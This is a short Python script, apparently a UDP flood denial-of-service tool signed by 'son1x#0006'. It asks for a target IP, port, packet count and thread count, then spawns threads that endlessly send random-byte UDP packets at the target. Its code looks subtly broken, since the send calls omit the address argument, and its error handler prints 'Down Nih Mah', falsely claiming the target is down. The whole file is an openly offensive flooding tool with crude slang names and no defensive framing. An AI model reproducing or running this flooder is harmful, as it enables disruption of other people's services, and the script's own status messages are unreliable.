import random
import socket
import threading
import os,sys
import time

os.system("clear")
print("son1x#0006 On Top")

kanjut1 = str(input("Ip : "))
kanjut2 = int(input("Port  : "))
kanjut3 = int(input("Paket : "))
kanjut4 = int(input("Thread : "))
def jancok():
    turu = random._urandom(900)        
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((kanjut1,kanjut2))
            s.sendto(turu)
            for x in range(kanjut3):
                s.sendto(turu)
            print("Attack By son1x#0006")
        except:
            print("Down Nih Mah")

def jancok2():
    turu = random._urandom(919)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((kanjut1,kanjut2))
            s.sendto(turu)
            for x in range(kanjut3):
                s.sendto(turu)
            print("Attack By son1x#0006")
        except:
            print("Down Nih Mah")

def jancok3():
    turu = random._urandom(800)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
            s.connect((kanjut1,kanjut2))
            s.sendto(turu)
            for x in range(kanjut3):
                s.sendto(turu)
            print("Attack By son1x#0006")
        except:
            print("Down Nih Mah")
            
for y in range(kanjut4):
    th = threading.Thread(target=jancok)
    th.start()
    th = threading.Thread(target=jancok2)
    th.start()
    th = threading.Thread(target=jancok3)
    th.start()
